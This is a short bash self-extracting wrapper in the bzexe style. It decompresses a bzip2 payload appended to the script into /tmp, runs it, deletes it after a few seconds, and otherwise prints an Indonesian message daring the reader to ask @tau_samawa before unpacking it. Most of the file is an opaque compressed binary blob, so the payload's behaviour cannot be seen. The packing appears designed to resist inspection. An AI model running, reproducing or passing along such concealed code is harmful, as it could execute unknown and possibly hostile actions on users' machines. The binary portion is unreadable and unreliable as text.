#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYbh�{ ��E�@ ���?�������@�D@0  `��ҽ��w�muڭ%IP��J{BCM 4hh=M4hhښ 4� 4�A����� hh4d  �bA�HM'�hdh � ��=C��	5(F��SF�h�'�h �&@  4 J�4d�&�����  z��  �� �E4�MS�O�ѩ�g�'�M�A�`c!�2"#'��^���H�:��(v6H�P����ELY����权u�� 8B�� U��oOt-vuٕY������e���XP̬�-(\C3�����1)���z�[)K歘�H;?�6����*tݻ3=�ғn�0���[�k�W~:�Xp+#M|�U*Q{�U5
�}Gep��BM�wLʗ�O*���������������cb�K���{�8����*�9���q��!	�\-b�D;�Rͬ]p��(��(�)��5j�ʣP��)�T
)�iƮvLy�w�ߓA�ߛi1y1˰y�<�kh�^s'�
��B�C����q�x�D5��,6v(��;�W�2@ s���z�f;�oЯ�I��mF�%!x4e��𬰄v�°�+T�TO��=EE}��3m�;y���5%I�J"aFaq*�`��vJ�V��`�B����L�G
(��(��(��I(�ږ��mƊ����!!!4�^ୌо�� ͤ�.c�J@G4�Ӑ�!x#,)��%I����I��i�1&%+�+�5���`"]��l�%����4i8am�R�(!%�:��� ulH]�b��
�
%��G?hV�[��=t�C���hc��Eh+��b?��h�F�1���f��A��y�� ���K.N|��6�<�Q�_ ��"K4����;��?����%I	�7)�	^L�1%�,�G�j3ntI&|�"��-�Ȯw�閸V�sY�tt���q�¼�ӎX;�E�˷a�D<1�=̞�n�SFf�x���l.�K,��4��7U�G�>�^�CEײO�PX ���T�@�p<+y$�-/¨�����O �Y��E�yZi�����W��y��z�_U!��@�o��+klN^pӟ��uƱx��0$ܜ���y�r�����]���kl�m��I��o��v�p3 �Ei���������յWGgC��1�c�1�c�1�c�9*�� V+�Z���t(�9BШHHR�j��P��5/�$$f��xfژ*�+zT ky�`�w�{J.��@��J�N8^;jx�S!����=��UB��h+�&�܇�qȫ��xV	�!!r�V�+5GXW(4�5M��<���E��m.nh���J�or��&s�d$J�ie]�_��\,���7�>������v��<��pǬn�HJ�p5�*􂶕�7 o�M⼩���W!�s�W�*1nc�1�HBI$��⫬t�b��&e���Kf�D�	~!�^!��E�+B��j����W}zBI$���I�j!x��ݽ)ʙ��n��Z��CSS�d"���0vL� �\�x���o��߻| p�}�ܑN$�>�